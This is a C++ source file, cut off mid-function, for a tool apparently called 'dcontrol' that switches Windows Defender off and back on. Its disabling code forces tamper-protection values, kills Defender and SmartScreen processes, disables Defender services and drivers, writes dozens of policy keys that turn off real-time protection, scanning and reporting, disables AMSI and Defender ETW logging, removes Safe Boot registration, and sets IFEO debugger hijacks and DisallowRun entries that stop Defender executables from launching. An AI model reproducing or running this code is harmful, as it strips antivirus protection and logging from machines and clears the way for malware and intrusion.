#include "dcontrol.hpp"
#include <vector>
#include <string>

namespace dcontrol
{
  // Toggles windows tamper protection.
  //
  // IMPORTANT / LIMITATION: while Tamper Protection is ACTIVE on a modern build,
  // the TamperProtection value lives under MsMpEng's PPL/ELAM-protected scope and
  // any write from here (even as SYSTEM/TrustedInstaller) is silently reverted.
  // This is therefore best-effort: it only "sticks" if TP is already off, or if the
  // write happens before the protected service is running. There is no reliable
  // in-process registry fix - the real options are the Security UI, MDM/Intune, or
  // editing the hive offline (WinRE / another OS). Treat failure here as expected.
  //
  void toggle_tamper(bool enable)
  {
    HKEY hkey;

    if (reg::create_registry(L"SOFTWARE\\Microsoft\\Windows Defender\\Features", hkey))
    {
      if (enable)
      {
        if (!reg::set_keyval(hkey, L"TamperProtection", 5))
          printf("failed to write to TamperProtection\n");

        // Remove the source override when re-enabling
        reg::delete_value(hkey, L"TamperProtectionSource");
      }
      else
      {
        // Value 4 = disabled by TrustedInstaller, more resilient than 0 on newer builds
        if (!reg::set_keyval(hkey, L"TamperProtection", 4))
          printf("failed to write to TamperProtection\n");

        // Source 2 = indicates the setting was made by a trusted source
        if (!reg::set_keyval(hkey, L"TamperProtectionSource", 2))
          printf("failed to write to TamperProtectionSource\n");
      }
    }
  }

  // Returns true if Tamper Protection appears to be enabled.
  // Features\TamperProtection: bit 0 set => enabled (1/5 = on, 0/4 = off).
  //
  bool is_tamper_enabled()
  {
    auto value = reg::read_key(
      L"SOFTWARE\\Microsoft\\Windows Defender\\Features",
      L"TamperProtection");

    if (value == (DWORD)-1)
      return false; // unreadable - don't block, just proceed

    return (value & 1) != 0;
  }

  // Authoritative Tamper Protection check via WMI (MSFT_MpComputerStatus).
  //
  bool is_tamper_enabled_wmi()
  {
    // MSFT_MpComputerStatus is a read-only class (no method); the helper
    // constructor is guarded to handle that.
    auto helper = new wmic::helper(
      "Root\\Microsoft\\Windows\\Defender",
      "MSFT_MpComputerStatus",
      "Get");

    // If WMI couldn't be reached, fall back to the registry heuristic.
    if (helper->get_last_error())
    {
      delete helper;
      return is_tamper_enabled();
    }

    bool result = false;
    if (!helper->get<bool>("IsTamperProtected", wmic::variant_type::t_bool, result))
    {
      delete helper;
      return is_tamper_enabled();
    }

    delete helper;
    return result;
  }

  // Ends the smart screen process
  //
  void kill_smartscreen()
  {
    auto pid = util::get_pid("smartscreen.exe");
    auto proc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);

    // TODO: Create a better solution to terminate smartscreen
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminateprocess
    // The state of global data maintained by dynamic-link libraries 
    // (DLLs) may be compromised if TerminateProcess is used rather than ExitProcess.
    // e.g. Injecting code to execute ExitProcess and manually unloaded everything 

    TerminateProcess(proc, 0);

    if (proc)
      CloseHandle(proc);
  }

  // Helper: kill a process by name (best-effort, silent on failure)
  //
  static void kill_process(const char* name)
  {
    auto pid = util::get_pid(name);
    if (pid == (DWORD)-1)
      return;

    auto proc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (proc)
    {
      TerminateProcess(proc, 0);
      CloseHandle(proc);
    }
  }

  // Kill all defender-related processes
  //
  void kill_defender_processes()
  {
    const char* targets[] = {
      "MsMpEng.exe",
      "NisSrv.exe",
      "MpCmdRun.exe",
      "SecurityHealthService.exe",
      "SecurityHealthHost.exe",
      "MpDefenderCoreService.exe",
      "MpCopyAccelerator.exe",
      "MpDlpService.exe",
      "MpDlpCmd.exe",
      "ConfigSecurityPolicy.exe",
      "SgrmBroker.exe",
      "SgrmLpac.exe"
    };

    for (auto& target : targets)
      kill_process(target);
  }

  // Helper: set a DWORD value on an HKLM service key (best-effort)
  //
  static void set_service_start(const wchar_t* service_name, DWORD start_value)
  {
    wchar_t path[256];
    swprintf_s(path, L"SYSTEM\\CurrentControlSet\\Services\\%ls", service_name);

    // Read-before-write so we never error on a value that is already correct.
    // WdFilter tamper-protection rejects live writes to the Wd*/Defender service keys
    // even for TrustedInstaller, so re-writing a value that is ALREADY correct fails
    // noisily for nothing. If Start is already what we want, skip silently.
    if (reg::read_key(path, L"Start") == start_value)
      return;

    HKEY hkey;
    if (reg::create_registry(path, hkey))
    {
      if (!reg::set_keyval(hkey, L"Start", start_value))
        wprintf(L"  Start for %ls is kernel-locked by WdFilter (left as-is; "
                L"fix offline if needed)\n", service_name);
    }
  }

  // Disable defender-related services via registry Start value
  //
  void disable_services_registry()
  {
    printf("Disabling defender services...\n");

    const wchar_t* services[] = {
      L"WdNisSvc",            // Network Inspection Service
      L"WdNisDrv",            // Network Inspection Driver
      L"WdFilter",            // Minifilter Driver
      L"WdBoot",              // Boot Driver (ELAM)
      L"WdDevFlt",            // Device Filter Driver
      L"MsSecFlt",            // Security Events Filter
      L"MsSecCore",           // Secure Boot Core Driver
      L"SgrmAgent",           // System Guard Runtime Monitor Agent
      L"SgrmBroker",          // System Guard Runtime Monitor Broker
      L"SecurityHealthService", // Windows Security Health
      L"Sense",               // Advanced Threat Protection
      L"MDDlpSvc",            // Data Loss Prevention
      L"MsSecWfp",            // Security WFP Callout Driver
      L"webthreatdefsvc",     // Web Threat Defense (Win11 22H2+)
    };

    for (auto& svc : services)
      set_service_start(svc, 4); // 4 = Disabled
  }

  // Re-enable defender-related services via registry Start value
  //
  void enable_services_registry()
  {
    printf("Enabling defender services...\n");

    // Boot-start drivers (original Start = 0)
    set_service_start(L"WdFilter", 0);
    set_service_start(L"WdBoot", 0);
    set_service_start(L"MsSecFlt", 0);
    set_service_start(L"MsSecCore", 0);

    // Auto-start services (original Start = 2)
    set_service_start(L"SgrmBroker", 2);

    // Manual/demand-start services (original Start = 3)
    set_service_start(L"WdNisSvc", 3);
    set_service_start(L"WdNisDrv", 3);
    set_service_start(L"WdDevFlt", 3);
    set_service_start(L"SgrmAgent", 3);
    set_service_start(L"SecurityHealthService", 3);
    set_service_start(L"Sense", 3);
    set_service_start(L"MDDlpSvc", 3);
    set_service_start(L"MsSecWfp", 3);
    set_service_start(L"webthreatdefsvc", 3);
  }

  // Helper: write a DWORD to a policy subkey (best-effort)
  //
  static void set_policy_dword(const wchar_t* sub_path, const wchar_t* value_name, DWORD value)
  {
    HKEY hkey;
    if (reg::create_registry(sub_path, hkey))
    {
      if (!reg::set_keyval(hkey, value_name, value))
        wprintf(L"  failed to write %ls\\%ls\n", sub_path, value_name);
    }
  }

  // Helper: write a REG_SZ to a policy subkey (best-effort)
  //
  static void set_policy_sz(const wchar_t* sub_path, const wchar_t* value_name, const wchar_t* value)
  {
    HKEY hkey;
    if (reg::create_registry(sub_path, hkey))
    {
      if (!reg::set_keyval_sz(hkey, value_name, value))
        wprintf(L"  failed to write %ls\\%ls\n", sub_path, value_name);
    }
  }

  // Set all group policy registry keys to disable defender subsystems
  //
  void set_group_policies(bool disable)
  {
    if (disable)
    {
      printf("Setting group policy keys...\n");

      // --- Root Defender policy ---
      const wchar_t* root = L"SOFTWARE\\Policies\\Microsoft\\Windows Defender";
      set_policy_dword(root, L"DisableAntiSpyware", 1);
      set_policy_dword(root, L"DisableRoutinelyTakingAction", 1);
      set_policy_dword(root, L"ServiceKeepAlive", 0);
      set_policy_dword(root, L"AllowFastServiceStartup", 0);
      set_policy_dword(root, L"RandomizeScheduleTaskTimes", 0);
      set_policy_dword(root, L"PUAProtection", 0);

      // --- MpEngine ---
      const wchar_t* engine = L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine";
      set_policy_dword(engine, L"MpEnablePus", 0);
      set_policy_dword(engine, L"MpCloudBlockLevel", 0);
      set_policy_dword(engine, L"MpBafsExtendedTimeout", 50);
      set_policy_dword(engine, L"EnableFileHashComputation", 0);

      // --- MpEngine direct (non-policy) mirror ---
      const wchar_t* engine_direct = L"SOFTWARE\\Microsoft\\Windows Defender\\MpEngine";
      set_policy_dword(engine_direct, L"MpCloudBlockLevel", 0);
      set_policy_dword(engine_direct, L"MpBafsExtendedTimeout", 50);

      // --- SpyNet / MAPS ---
      const wchar_t* spynet = L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet";
      set_policy_dword(spynet, L"DisableBlockAtFirstSeen", 1);
      set_policy_dword(spynet, L"SpynetReporting", 0);
      set_policy_dword(spynet, L"SubmitSamplesConsent", 2);
      set_policy_dword(spynet, L"LocalSettingOverrideSpynetReporting", 0);

      // --- Real-Time Protection ---
      const wchar_t* rtp = L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection";
      set_policy_dword(rtp, L"DisableBehaviorMonitoring", 1);
      set_policy_dword(rtp, L"DisableIOAVProtection", 1);
      set_policy_dword(rtp, L"DisableOnAccessProtection", 1);
      set_policy_dword(rtp, L"DisableRealtimeMonitoring", 1);
      set_policy_dword(rtp, L"DisableIntrusionPreventionSystem", 1);
      set_policy_dword(rtp, L"DisableScanOnRealtimeEnable", 1);
      set_policy_dword(rtp, L"DisableRawWriteNotification", 1);
      set_policy_dword(rtp, L"DisableInformationProtectionControl", 1);
      set_policy_dword(rtp, L"IOAVMaxSize", 1);
      set_policy_dword(rtp, L"RealTimeScanDirection", 1);

      // --- NIS (Network Inspection) ---
      const wchar_t* nis = L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\NIS";
      set_policy_dword(nis, L"DisableProtocolRecognition", 1);
      set_policy_dword(
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\NIS\\Consumers\\IPS",
        L"DisableSignatureRetirement", 1);
      set_policy_dword(
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\NIS\\Consumers\\IPS",
        L"ThrottleDetectionEventsRate", 10000000);

      // --- Scan ---
      const wchar_t* scan = L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Scan";
      set_policy_dword(scan, L"DisableHeuristics", 1);
      set_policy_dword(scan, L"DisableArchiveScanning", 1);
      set_policy_dword(scan, L"DisableEmailScanning", 1);
      set_policy_dword(scan, L"DisableRemovableDriveScanning", 1);
      set_policy_dword(scan, L"DisablePackedExeScanning", 1);
      set_policy_dword(scan, L"DisableScanningNetworkFiles", 1);
      set_policy_dword(scan, L"DisableScanningMappedNetworkDrivesForFullScan", 1);
      set_policy_dword(scan, L"DisableReparsePointScanning", 1);
      set_policy_dword(scan, L"DisableRestorePoint", 1);
      set_policy_dword(scan, L"DisableCatchupFullScan", 1);
      set_policy_dword(scan, L"DisableCatchupQuickScan", 1);
      set_policy_dword(scan, L"ScheduleDay", 8);
      set_policy_dword(scan, L"CheckForSignaturesBeforeRunningScan", 0);
      set_policy_dword(scan, L"PurgeItemsAfterDelay", 1);
      set_policy_dword(scan, L"AvgCPULoadFactor", 1);
      set_policy_dword(scan, L"ScanOnlyIfIdle", 1);
      set_policy_dword(scan, L"ArchiveMaxDepth", 0);
      set_policy_dword(scan, L"ArchiveMaxSize", 1);
      set_policy_dword(scan, L"MissedScheduledScanCountBeforeCatchup", 20);
      set_policy_dword(scan, L"QuickScanInterval", 24);
      set_policy_dword(scan, L"ScanParameters", 1);
      set_policy_dword(scan, L"DisableCpuThrottleOnIdleScans", 0);

      // --- Signature Updates ---
      const wchar_t* sig = L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates";
      set_policy_dword(sig, L"DisableScanOnUpdate", 1);
      set_policy_dword(sig, L"DisableUpdateOnStartupWithoutEngine", 1);
      set_policy_dword(sig, L"DisableScheduledSignatureUpdateOnBattery", 1);
      set_policy_dword(sig, L"SignatureDisableNotification", 0);
      set_policy_dword(sig, L"RealtimeSignatureDelivery", 0);
      set_policy_dword(sig, L"ScheduleDay", 8);
      set_policy_dword(sig, L"SignatureUpdateInterval", 24);
      set_policy_dword(sig, L"SignatureUpdateCatchupInterval", 0);
      set_policy_dword(sig, L"ASSignatureDue", 0xFFFFFFFF);
      set_policy_dword(sig, L"AVSignatureDue", 0xFFFFFFFF);
      set_policy_dword(sig, L"UpdateOnStartUp", 1);
      set_policy_dword(sig, L"ForceUpdateFromMU", 1);
      set_policy_dword(sig, L"CheckAlternateHttpLocation", 0);
      set_policy_dword(sig, L"CheckAlternateDownloadLocation", 0);

      // --- Threats ---
      set_policy_dword(
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Threats",
        L"Threats_ThreatSeverityDefaultAction", 1);
      const wchar_t* threats = L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Threats\\ThreatSeverityDefaultAction";
      set_policy_sz(threats, L"1", L"9");
      set_policy_sz(threats, L"2", L"9");
      set_policy_sz(threats, L"3", L"9");
      set_policy_sz(threats, L"4", L"9");
      set_policy_sz(threats, L"5", L"9");

      // --- Remediation ---
      set_policy_dword(
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Remediation",
        L"Scan_ScheduleDay", 8);

      // --- Quarantine ---
      set_policy_dword(
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Quarantine",
        L"PurgeItemsAfterDelay", 1);

      // --- Reporting ---
      const wchar_t* report = L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting";
      set_policy_dword(report, L"DisableGenericRePorts", 1);
      set_policy_dword(report, L"DisableEnhancedNotifications", 1);
      set_policy_dword(report, L"WppTracingLevel", 1);

      // --- Features ---
      const wchar_t* features = L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Features";
      set_policy_dword(features, L"DisableCoreService1DSTelemetry", 1);
      set_policy_dword(features, L"DisableCoreServiceECSIntegration", 1);

      // --- Exclusions ---
      set_policy_dword(
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions",
        L"DisableAutoExclusions", 1);

      // --- UX Configuration ---
      const wchar_t* ux = L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration";
      set_policy_dword(ux, L"Notification_Suppress", 1);
      set_policy_dword(ux, L"SuppressRebootNotification", 1);
      set_policy_dword(ux, L"UILockdown", 1);

      // --- MRT (Malicious Software Removal Tool) ---
      set_policy_dword(L"SOFTWARE\\Policies\\Microsoft\\MRT", L"DontReportInfectionInformation", 1);
      set_policy_dword(L"SOFTWARE\\Policies\\Microsoft\\MRT", L"DontOfferThroughWUAU", 1);

      // --- Microsoft Antimalware (legacy) ---
      set_policy_dword(
        L"SOFTWARE\\Policies\\Microsoft\\Microsoft Antimalware",
        L"ServiceKeepAlive", 0);
      set_policy_dword(
        L"SOFTWARE\\Policies\\Microsoft\\Microsoft Antimalware",
        L"AllowFastServiceStartup", 0);
      set_policy_dword(
        L"SOFTWARE\\Policies\\Microsoft\\Microsoft Antimalware\\Signature Updates",
        L"SignatureDisableNotification", 0);
    }
    else
    {
      printf("Clearing group policy keys...\n");

      // Delete the entire policy subtrees to restore defaults
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet");
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine");
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\NIS\\Consumers\\IPS");
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\NIS");
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Scan");
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates");
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Threats\\ThreatSeverityDefaultAction");
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Threats");
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Remediation");
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Quarantine");
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting");
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Features");
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions");
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration");

      // Restore root values
      HKEY hkey;
      if (reg::create_registry(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", hkey))
      {
        reg::set_keyval(hkey, L"DisableAntiSpyware", 0);
        reg::delete_value(hkey, L"DisableRoutinelyTakingAction");
        reg::delete_value(hkey, L"ServiceKeepAlive");
        reg::delete_value(hkey, L"AllowFastServiceStartup");
        reg::delete_value(hkey, L"RandomizeScheduleTaskTimes");
        reg::delete_value(hkey, L"PUAProtection");
      }

      // Clear MRT policies
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\MRT");

      // Clear the direct (non-policy) MpEngine mirror values
      if (reg::create_registry(L"SOFTWARE\\Microsoft\\Windows Defender\\MpEngine", hkey))
      {
        reg::delete_value(hkey, L"MpCloudBlockLevel");
        reg::delete_value(hkey, L"MpBafsExtendedTimeout");
      }

      // Clear Microsoft Antimalware (legacy) policies (child key first, then parent)
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Microsoft Antimalware\\Signature Updates");
      reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Microsoft Antimalware");
    }
  }

  // Disable SmartScreen via registry policies
  //
  void disable_smartscreen_registry()
  {
    printf("Disabling SmartScreen...\n");

    // Explorer SmartScreen
    set_policy_sz(
      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer",
      L"SmartScreenEnabled", L"Off");

    // 32-bit (WOW6432Node) Explorer SmartScreen
    set_policy_sz(
      L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Explorer",
      L"SmartScreenEnabled", L"Off");

    // Group Policy
    set_policy_dword(
      L"SOFTWARE\\Policies\\Microsoft\\Windows\\System",
      L"EnableSmartScreen", 0);
    set_policy_sz(
      L"SOFTWARE\\Policies\\Microsoft\\Windows\\System",
      L"ShellSmartScreenLevel", L"Warn");

    // App Install Control
    set_policy_dword(
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\SmartScreen",
      L"ConfigureAppInstallControlEnabled", 0);
    set_policy_sz(
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\SmartScreen",
      L"ConfigureAppInstall", L"Anywhere");
    set_policy_sz(
      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer",
      L"AicEnabled", L"Anywhere");

    // Store apps SmartScreen (HKCU)
    HKEY hkey;
    if (reg::create_registry_hkcu(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost", hkey))
    {
      reg::set_keyval(hkey, L"EnableWebContentEvaluation", 0);
      reg::set_keyval(hkey, L"PreventOverride", 0);
    }

    // HKLM AppHost
    set_policy_dword(
      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost",
      L"Enabled", 0);
    set_policy_dword(
      L"SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\AppHost",
      L"EnableWebContentEvaluation", 0);

    // Edge SmartScreen policies
    const wchar_t* edge = L"SOFTWARE\\Policies\\Microsoft\\Edge";
    set_policy_dword(edge, L"SmartScreenEnabled", 0);
    set_policy_dword(edge, L"SmartScreenPuaEnabled", 0);
    set_policy_dword(edge, L"PreventSmartScreenPromptOverride", 0);
    set_policy_dword(edge, L"PreventSmartScreenPromptOverrideForFiles", 0);
    set_policy_dword(edge, L"SmartScreenDnsRequestsEnabled", 0);
    set_policy_dword(edge, L"SmartScreenForTrustedDownloadsEnabled", 0);
    set_policy_dword(edge, L"NewSmartScreenLibraryEnabled", 0);
  }

  // Re-enable SmartScreen via registry
  //
  void enable_smartscreen_registry()
  {
    printf("Enabling SmartScreen...\n");

    HKEY hkey;

    set_policy_sz(
      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer",
      L"SmartScreenEnabled", L"Warn");

    // Restore 32-bit (WOW6432Node) Explorer SmartScreen
    set_policy_sz(
      L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Explorer",
      L"SmartScreenEnabled", L"Warn");

    // Clear the App Install Control Explorer flag
    if (reg::create_registry(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer", hkey))
      reg::delete_value(hkey, L"AicEnabled");

    if (reg::create_registry(L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", hkey))
    {
      reg::delete_value(hkey, L"EnableSmartScreen");
      reg::delete_value(hkey, L"ShellSmartScreenLevel");
    }

    reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\SmartScreen");

    if (reg::create_registry_hkcu(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost", hkey))
    {
      reg::set_keyval(hkey, L"EnableWebContentEvaluation", 1);
      reg::delete_value(hkey, L"PreventOverride");
    }

    if (reg::create_registry(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost", hkey))
    {
      reg::delete_value(hkey, L"Enabled");
    }

    reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\AppHost");
    reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Edge");
  }

  // Disable AMSI (Antimalware Scan Interface)
  //
  void disable_amsi()
  {
    printf("Disabling AMSI...\n");

    HKEY hkey;
    if (reg::create_registry_hkcu(L"Software\\Microsoft\\Windows Script\\Settings", hkey))
    {
      if (!reg::set_keyval(hkey, L"AmsiEnable", 0))
        printf("  failed to disable AMSI\n");
    }
  }

  // Re-enable AMSI
  //
  void enable_amsi()
  {
    printf("Enabling AMSI...\n");

    HKEY hkey;
    if (reg::create_registry_hkcu(L"Software\\Microsoft\\Windows Script\\Settings", hkey))
      reg::delete_value(hkey, L"AmsiEnable");
  }

  // Disable ETW logging and autologgers for Defender
  //
  void disable_etw_logging()
  {
    printf("Disabling ETW logging...\n");

    set_policy_dword(
      L"SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger",
      L"Start", 0);
    set_policy_dword(
      L"SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger",
      L"Start", 0);
    set_policy_dword(
      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational",
      L"Enabled", 0);
    set_policy_dword(
      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/WHC",
      L"Enabled", 0);
  }

  // Re-enable ETW logging
  //
  void enable_etw_logging()
  {
    printf("Enabling ETW logging...\n");

    set_policy_dword(
      L"SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger",
      L"Start", 1);
    set_policy_dword(
      L"SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger",
      L"Start", 1);
    set_policy_dword(
      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational",
      L"Enabled", 1);
    set_policy_dword(
      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/WHC",
      L"Enabled", 1);
  }

  // Set internal Defender state flags (requires TrustedInstaller)
  //
  void set_defender_internal_state(bool disable)
  {
    HKEY hkey;
    if (reg::create_registry(L"SOFTWARE\\Microsoft\\Windows Defender", hkey))
    {
      if (disable)
      {
        printf("Clearing Defender internal state...\n");
        reg::set_keyval(hkey, L"ServiceStartStates", 0);
        reg::set_keyval(hkey, L"IsServiceRunning", 0);
        reg::delete_value(hkey, L"ProductAppDataPath");
      }
      else
      {
        printf("Restoring Defender internal state...\n");
        reg::delete_value(hkey, L"ServiceStartStates");
        reg::delete_value(hkey, L"IsServiceRunning");
        // ProductAppDataPath will be recreated by Defender on startup
      }
    }
  }

  // Remove WinDefend from Safe Boot so Defender cannot start in Safe Mode
  //
  void disable_safe_boot_registration()
  {
    printf("Removing Safe Boot registration...\n");

    reg::delete_key(HKEY_LOCAL_MACHINE,
      L"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\WinDefend");
    reg::delete_key(HKEY_LOCAL_MACHINE,
      L"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\WinDefend");
  }

  // Restore WinDefend Safe Boot registration
  //
  void enable_safe_boot_registration()
  {
    printf("Restoring Safe Boot registration...\n");

    // Recreate the keys with default value "Service"
    HKEY hkey;
    if (reg::create_registry(
      L"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\WinDefend", hkey))
    {
      reg::set_keyval_sz(hkey, L"", L"Service");
    }
    if (reg::create_registry(
      L"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\WinDefend", hkey))
    {
      reg::set_keyval_sz(hkey, L"", L"Service");
    }
  }

  // Set IFEO (Image File Execution Options) debugger hijack to kill processes on launch
  //
  void set_ifeo_debugger_hijack(bool enable)
  {
    const wchar_t* targets[] = {
      L"MsMpEng.exe",
      L"MpCmdRun.exe",
      L"NisSrv.exe",
      L"MpDefenderCoreService.exe",
      L"MpCopyAccelerator.exe",
      L"MpDlpService.exe",
      L"MpDlpCmd.exe",
      L"ConfigSecurityPolicy.exe",
      L"smartscreen.exe",
      L"SgrmLpac.exe",
      L"SgrmBroker.exe",
      L"SecurityHealthService.exe",
      L"SecurityHealthHost.exe",
    };

    if (enable)
    {
      printf("Setting IFEO debugger hijack...\n");

      for (auto& target : targets)
      {
        wchar_t path[512];
        swprintf_s(path,
          L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%ls",
          target);

        HKEY hkey;
        if (reg::create_registry(path, hkey))
        {
          reg::set_keyval_sz(hkey, L"Debugger",
            L"%SYSTEMROOT%\\System32\\taskkill.exe");
        }
      }
    }
    else
    {
      printf("Removing IFEO debugger hijack...\n");

      for (auto& target : targets)
      {
        wchar_t path[512];
        swprintf_s(path,
          L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%ls",
          target);

        HKEY hkey;
        if (reg::create_registry(path, hkey))
          reg::delete_value(hkey, L"Debugger");
      }
    }
  }

  // Set Explorer DisallowRun policy to block Defender executables
  //
  void set_disallow_run(bool enable)
  {
    const wchar_t* targets[] = {
      L"MsMpEng.exe",
      L"MpCmdRun.exe",
      L"NisSrv.exe",
      L"MpDefenderCoreService.exe",
      L"MpCopyAccelerator.exe",
      L"MpDlpService.exe",
      L"MpDlpCmd.exe",
      L"ConfigSecurityPolicy.exe",
      L"smartscreen.exe",
      L"SgrmLpac.exe",
      L"SgrmBroker.exe",
      L"SecurityHealthService.exe",
      L"SecurityHealthHost.exe",
    };

    if (enable)
    {
      printf("Setting Explorer DisallowRun policy...\n");

      // Enable the DisallowRun policy
      HKEY hkey;
      if (reg::create_registry_hkcu(
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", hkey))
      {
        reg::set_keyval(hkey, L"DisallowRun", 1);
      }

      // Add numbered entries for each target
      HKEY hkey_list;
      if (reg::create_registry_hkcu(
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun",
        hkey_list))
      {
        int index = 1;
        for (auto& target : targets)
        {
          wchar_t idx_str[16];
          swprintf_s(idx_str, L"%d", index++);
          reg::set_keyval_sz(hkey_list, idx_str, target);
        }
      }
    }
    else
    {
      printf("Removing Explorer DisallowRun policy...\n");

      HKEY hkey;
      if (reg::create_registry_hkcu(
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", hkey))
      {
        reg::delete_value(hkey, L"DisallowRun");
      }

      reg::delete_key(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun");
    }
  }

  // Suppress all Defender-related notifications
  //
  void disable_notifications()
  {
    printf("Disabling notifications...\n");

    // Windows Security notifications (policy + direct)
    set_policy_dword(
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications",
      L"DisableNotifications", 1);
    set_policy_dword(
      L"SOFTWARE\\Microsoft\\Windows Defender Security Center\\Notifications",
      L"DisableNotifications", 1);
    set_policy_dword(
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications",
      L"DisableEnhancedNotifications", 1);
    set_policy_dword(
      L"SOFTWARE\\Microsoft\\Windows Defender Security Center\\Notifications",
      L"DisableEnhancedNotifications", 1);

    // Defender Antivirus notifications
    set_policy_dword(
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting",
      L"DisableEnhancedNotifications", 1);

    // HKCU notification settings
    HKEY hkey;
    if (reg::create_registry_hkcu(
      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance",
      hkey))
    {
      reg::set_keyval(hkey, L"Enabled", 0);
    }

    if (reg::create_registry_hkcu(
